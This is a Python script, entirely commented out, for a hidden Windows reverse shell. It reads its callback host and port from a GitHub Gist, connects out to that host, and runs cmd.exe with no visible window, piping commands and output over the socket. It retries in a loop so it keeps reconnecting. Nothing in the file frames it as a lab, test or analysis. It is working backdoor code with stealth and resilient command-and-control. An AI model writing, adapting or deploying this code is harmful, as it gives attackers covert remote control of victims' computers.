# import os
# import socket
# import subprocess
# import threading
# import time
# import json
# from urllib.request import urlopen, Request
# from urllib.error import URLError, HTTPError

# # --- Configuration ---
# # Your Gist ID
# GIST_ID = "39fa66d009773b8324cc5845a9284930"
# API_URL = f"https://api.github.com/gists/{GIST_ID}"
# FILE_NAME = "reverse.txt"
# RETRY_DELAY = 10 

# # --- Exact Logic from Your Working Snippet ---

# def s2p(s, p):
#     """Reads from Socket, writes to Process (stdin)"""
#     while True:
#         try:
#             data = s.recv(1024)
#             if len(data) > 0:
#                 p.stdin.write(data)
#                 p.stdin.flush()
#             else:
#                 break # Remote closed connection
#         except:
#             break

# def p2s(s, p):
#     """Reads from Process (stdout), sends to Socket"""
#     while True:
#         try:
#             # Using read(1) as requested - simple and reliable
#             data = p.stdout.read(1)
#             if data:
#                 s.send(data)
#             else:
#                 break # Process ended
#         except:
#             break

# # --- Main Execution Loop ---

# def connect_and_run():
#     print("\nStarting Windows Dynamic Client...")

#     while True:
#         # 1. FETCH CONNECTION DETAILS
#         current_host = None
#         current_port = None
        
#         try:
#             # Fetch Gist Metadata
#             with urlopen(API_URL, timeout=10) as response:
#                 gist_data = json.loads(response.read().decode('utf-8'))
            
#             raw_url = gist_data['files'][FILE_NAME]['raw_url']
            
#             # Fetch Content
#             with urlopen(raw_url, timeout=10) as response:
#                 lines = response.read().decode('utf-8').splitlines()

#             # Parse Host/Port
#             for line in lines:
#                 if ":" not in line: continue
#                 label, value = line.split(":", 1)
#                 label = label.strip().lower()
#                 value = value.strip()

#                 if label == "host":
#                     if "://" in value:
#                         value = value.split("://", 1)[1]
#                     current_host = value
#                 elif label == "port":
#                     current_port = int(value)

#             if not current_host or not current_port:
#                 time.sleep(RETRY_DELAY)
#                 continue

#         except Exception:
#             time.sleep(RETRY_DELAY)
#             continue

#         # 2. CONNECT AND START SHELL
#         s = None
#         try:
#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             s.connect((current_host, current_port))

#             # Launch CMD.EXE (Windows version of "sh")
#             # We add CREATE_NO_WINDOW to ensure it stays hidden
#             p = subprocess.Popen(
#                 ["cmd.exe"], 
#                 stdout=subprocess.PIPE, 
#                 stderr=subprocess.STDOUT, 
#                 stdin=subprocess.PIPE,
#                 creationflags=subprocess.CREATE_NO_WINDOW
#             )

#             # Start the threads using your exact logic
#             s2p_thread = threading.Thread(target=s2p, args=[s, p])
#             s2p_thread.daemon = True
#             s2p_thread.start()

#             p2s_thread = threading.Thread(target=p2s, args=[s, p])
#             p2s_thread.daemon = True
#             p2s_thread.start()

#             # Wait for the shell to finish
#             p.wait()

#         except Exception:
#             pass # Connection failed or dropped

#         finally:
#             if s:
#                 try:
#                     s.close()
#                 except:
#                     pass
#             time.sleep(RETRY_DELAY)

# if __name__ == "__main__":
#     connect_and_run()
